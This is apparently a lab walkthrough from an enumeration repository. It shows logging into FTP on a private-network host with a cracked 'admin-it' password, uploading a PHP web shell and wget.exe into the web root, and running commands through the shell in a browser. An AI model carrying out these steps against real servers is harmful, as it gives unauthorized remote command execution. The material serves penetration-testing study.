now will be crack ftp user admin-it password junior with hydra:

$`ftp 192.168.244.132`

`admin-it`

`junior`

>`pwd`
now you are in the home dirictory of the admin-it

let to go to web service directory 

>`cd /var/www`

>`ls`

will see the admin-it folder with the permsion 

now will be enter to this folder 

>`cd admin-it`

>`ls`


<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/2-ftp/3-login%20ftp%20with%20admin-it/ftp%20admin-it.png">
now the folder is empty



this folder can be open by the web server in browser:



<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/2-ftp/3-login%20ftp%20with%20admin-it/ftp%20in%20web%20browser.png">


so you can upload to this folder a file

in my attacker ip in the /home/feras there is   files  wget.exe and simple-webshell.php it will be upload to the /var/www/admin-it
 
 use command put upload file:

>`put simple-webshell.php`

if you want to upload or download files ascii in ftp you must type the binary or ascii before put or get command

>`binary`

>`put wget.exe`

>`ls`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/2-ftp/3-login%20ftp%20with%20admin-it/put%20file.png">

now we can open the folder with browser :


<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/2-ftp/3-login%20ftp%20with%20admin-it/finish.png">


you can run the simple-webshell.php in the browser with the command line in browser

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/2-ftp/3-login%20ftp%20with%20admin-it/webshell.png">





